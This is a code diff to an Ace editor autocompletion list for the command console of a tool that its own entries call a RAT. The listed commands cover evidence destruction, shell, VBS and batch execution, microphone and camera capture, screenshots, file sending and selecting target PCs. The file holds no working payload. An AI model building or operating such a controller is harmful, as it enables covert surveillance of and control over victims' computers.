@@ -265,64 +265,86 @@ editor.setOptions({
  showPrintMargin: false,
  fontSize: "13px",
  maxLines: Infinity,
- enableSnippets: true,
  enableBasicAutocompletion: true,
  enableLiveAutocompletion: true,
 });
 
 var wordList = [
- {value: "Excape();", meta: "Execute Batch script and Escape()"},
- {value: "Escape();", meta: "Destroy Evidence and Escape"},
- {value: "Marco();", meta: "Returns Polo if Online"},
- {value: "Close();", meta: "End Execution"},
- {value: "Update();", meta: "Updates self"},
- {value: "Hibernate();", meta: "Hibernate till date"},
- {value: "Revive();", meta: "End Hibernation  "},
- {value: "Notify();", meta: "Notifies power schedule"},
- {value: "Rename();", meta: "Renames RAT"},
- {value: "Flash();", meta: "Flashes Screen, Visual Indication"},
- {value: "Vbs();", meta: "Runs .VBS Script"},
- {value: "Bat();", meta: "Runs .Bat Script"},
- {value: "Shell();", meta: "Runs Shell Commands"},
- {value: "Speak();", meta: "Text to Speech"},
- {value: "Play();", meta: "Play a Remote (mp3) Audio File (URL)"},
- {value: "Mic();", meta: "Records audio for 'x' ms"},
- {value: "Lock();", meta: "Select Target"},
- {value: "Info();", meta: "Shows Info box"},
- {value: "Warn();", meta: "Shows Warning Box"},
- {value: "Error();", meta: "Shows Error box"},
- {value: "Msgbox(x,y);", meta: "Shows Msg Box fo 'y' ms"},
- {value: "Google();", meta: "Googles selected Text"},
- {value: "Web();", meta: "Navigates to 'x' url"},
- {value: "Type();", meta: "Types custom text"},
- {value: "Screenshot();", meta: "Takes a Screenshot"},
- {value: "Camera();", meta: "Captures a Photo"},
- {value: "Disk();", meta: "Retrieves Disk Info"},
- {value: "Tree();", meta: "Retrieves Disk Info"},
- {value: "Send();", meta: "Sends a File"},
- {value: "Zip();", meta: "Zip a folder"},
- {value: "Unzip();", meta: "Unzips file"},
- {value: "Health();", meta: "Reports back working conditions"},
- {value: "Log();", meta: "Logs every Activity"},
- {value: "Delay();", meta: "Pause Execution temporarily for 'x' ms"},
- {value: "Clone();", meta: "Initiate Clone Operations"},
- {value: "Noclone();", meta: "Stops Cloning op"},
+ {value: "Excape();", args: true, meta: " Execute Batch script and Escape()"},
+ {value: "Escape();", args: true, meta: " Destroy Evidence and Escape"},
+ {value: "Marco();", args: false, meta: " Returns Polo if Online"},
+ {value: "Close();", args: false, meta: " End Execution"},
+ {value: "Update();", args: true, meta: " Updates self"},
+ {value: "Hibernate();", args: true, meta: " Hibernate till date"},
+ {value: "Revive();", args: true, meta: " End Hibernation  "},
+ {value: "Notify();", args: true, meta: " Notifies power schedule"},
+ {value: "Rename();", args: true, meta: " Renames RAT"},
+ {value: "Flash();", args: true, meta: " Flashes Screen, Visual Indication"},
+ {value: "Vbs();", args: true, meta: " Runs .VBS Script"},
+ {value: "Bat();", args: true, meta: " Runs .Bat Script"},
+ {value: "Shell();", args: true, meta: " Runs Shell Commands"},
+ {value: "Speak();", args: true, meta: " Text to Speech"},
+ {value: "Play();", args: true, meta: " Play a Remote (mp3) Audio File (URL)"},
+ {value: "Mic();", args: true, meta: " Records audio for 'x' ms"},
+ {value: "Lock();", args: true, meta: " Select Target"},
+ {value: "Class();", args: true, meta: " Select a particular class of PCs"},
+ {value: "All();", args: false, meta: " Selects All system"},
+ {value: "Info();", args: true, meta: " Shows Info box"},
+ {value: "Warn();", args: true, meta: " Shows Warning Box"},
+ {value: "Error();", args: true, meta: " Shows Error box"},
+ {value: "Msgbox(x,y);", args: true, meta: " Shows Msg Box fo 'y' ms"},
+ {value: "Google();", args: true, meta: " Googles selected Text"},
+ {value: "Web();", args: true, meta: " Navigates to 'x' url"},
+ {value: "Type();", args: true, meta: " Types custom text"},
+ {value: "Screenshot();", args: true, meta: " Takes a Screenshot"},
+ {value: "Camera();", args: true, meta: " Captures a Photo"},
+ {value: "Disk();", args: true, meta: " Retrieves Disk Info"},
+ {value: "Tree();", args: true, meta: " Retrieves Disk Info"},
+ {value: "Send();", args: true, meta: " Sends a File"},
+ {value: "Zip();", args: true, meta: " Zip a folder"},
+ {value: "Unzip();", args: true, meta: " Unzips file"},
+ {value: "Health();", args: true, meta: " Reports back working conditions"},
+ {value: "Log();", args: true, meta: " Logs every Activity"},
+ {value: "Delay();", args: true, meta: " Pause Execution temporarily for 'x' ms"},
+ {value: "Clone();", args: true, meta: " Initiate Clone Operations"},
+ {value: "NClone();", args: false, meta: " Stops Cloning op"},
 ];
 var staticWordCompleter = {
  getCompletions: function (editor, session, pos, prefix, callback) {
   let line = session.getLine(pos.row);
   let lineStart = line.slice(0, pos.column - prefix.length);
-  var myList = /PC\.\s*$/i.test(lineStart) ? wordList : [];
-  callback(
-   null,
-   myList.map((item) => {
-    return {
-     value: item.value,
-     meta: item.meta,
-     score: 1000,
-    };
-   })
-  );
+  var myList = /PC\.\s*$/.test(lineStart) ? wordList : [];
+  if (prefix.length == 0) {
+   callback(
+    null,
+    myList.map((item) => {
+     return {
+      value: item.value,
+      meta: item.meta,
+      score: 1000,
+      completer: {
+       insertMatch: function (editor, data) {
+        editor.session.insert(editor.getCursorPosition(), data.value);
+        if (item.args) {
+         editor.gotoLine(pos.row + 1, pos.column + data.value.length - 2);
+        }
+       },
+      },
+     };
+    })
+   );
+  } else {
+   callback(
+    null,
+    myList.map((item) => {
+     return {
+      value: item.value,
+      meta: item.meta,
+      score: 1000,
+     };
+    })
+   );
+  }
  },
 };
 editor.completers = [staticWordCompleter];
